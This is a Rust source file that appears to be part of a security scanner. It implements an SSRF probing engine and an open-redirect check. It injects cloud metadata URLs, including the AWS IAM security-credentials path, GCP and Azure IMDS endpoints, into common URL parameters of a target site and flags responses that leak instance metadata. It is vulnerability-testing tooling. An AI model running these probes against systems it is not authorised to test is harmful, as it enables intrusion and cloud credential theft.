//! SSRF Advanced Engine — parameter injection with cloud metadata URLs, open redirect probing.
//! MITRE: T1090 (Proxy).

use crate::engine_result::{print_result, EngineResult};
use serde_json::json;
use std::time::Duration;

fn make_client() -> reqwest::Client {
    reqwest::Client::builder()
        .timeout(Duration::from_secs(8))
        .danger_accept_invalid_certs(weissman_core::tls_policy::danger_accept_invalid_certs())
        .build()
        .unwrap_or_else(|_| reqwest::Client::new())
}

fn base_url(target: &str) -> String {
    let t = target.trim().trim_end_matches('/');
    if t.starts_with("http://") || t.starts_with("https://") {
        t.to_string()
    } else {
        format!("https://{}", t)
    }
}

pub async fn run_ssrf_advanced_result(target: &str) -> EngineResult {
    let client = make_client();
    let base = base_url(target);
    let mut findings = Vec::new();

    let ssrf_params = ["url", "webhook", "redirect", "callback", "fetch", "endpoint", "uri", "target", "src", "source", "dest", "destination", "load"];
    let metadata_urls = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/v1/",
        // Azure IMDS
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    ];

    // Probe SSRF via GET query parameters
    for param in &ssrf_params {
        for meta_url in &metadata_urls {
            let probe_url = format!("{}/?{}={}", base, param, meta_url);
            if let Ok(resp) = client.get(&probe_url).send().await {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                // Cloud metadata response indicators
                let hit = body.contains("ami-id")
                    || body.contains("instance-id")
                    || body.contains("iam")
                    || body.contains("computeMetadata")
                    || body.contains("project-id")
                    || body.contains("serviceAccounts")
                    || (status == 200 && body.len() > 20 && body.contains("169.254"));

                if hit {
                    findings.push(json!({
                        "type": "ssrf_advanced",
                        "title": "SSRF: Cloud Metadata Accessible via Parameter",
                        "severity": "critical",
                        "mitre_attack": "T1090",
                        "description": format!(
                            "SSRF confirmed: parameter '{}' at {} fetched cloud instance metadata from {}. Credential theft is likely possible.",
                            param, base, meta_url
                        ),
                        "value": probe_url
                    }));
                    break;
                }
                // Parameter accepted and returned 200 — candidate for further testing
                if status == 200 && !body.is_empty() {
                    findings.push(json!({
                        "type": "ssrf_advanced",
                        "title": format!("Potential SSRF Parameter Detected: {}", param),
                        "severity": "medium",
                        "mitre_attack": "T1090",
                        "description": format!(
                            "The parameter '{}' at {} accepted an external URL (HTTP {}). Manual SSRF testing with out-of-band callbacks is recommended.",
                            param, base, status
                        ),
                        "value": probe_url
                    }));
                    break;
                }
            }
        }
    }

    // Probe open redirectors
    let redirect_params = ["url", "next", "return", "returnUrl", "return_url", "redirect", "redir", "goto", "forward"];
    let redirect_target = "https://example.com/ssrf-open-redirect-test";
    for param in &redirect_params {
        let probe_url = format!("{}/?{}={}", base, param, redirect_target);
        if let Ok(resp) = client
            .get(&probe_url)
            .send()
            .await
        {
            let status = resp.status().as_u16();
            if status == 301 || status == 302 || status == 307 || status == 308 {
                if let Some(loc) = resp.headers().get("location") {
                    if loc.to_str().unwrap_or("").contains("example.com") {
                        findings.push(json!({
                            "type": "ssrf_advanced",
                            "title": "Open Redirect Confirmed",
                            "severity": "high",
                            "mitre_attack": "T1090",
                            "description": format!(
                                "Open redirect confirmed at {} via parameter '{}'. Redirects to attacker-controlled URL, enabling phishing and SSRF chaining.",
                                probe_url, param
                            ),
                            "value": probe_url
                        }));
                    }
                }
            }
        }
    }

    let message = if findings.is_empty() {
        "No SSRF indicators detected".to_string()
    } else {
        format!("{} SSRF issue(s) found", findings.len())
    };
    EngineResult::ok(findings, message)
}

pub async fn run_ssrf_advanced(target: &str) {
    print_result(run_ssrf_advanced_result(target).await);
}
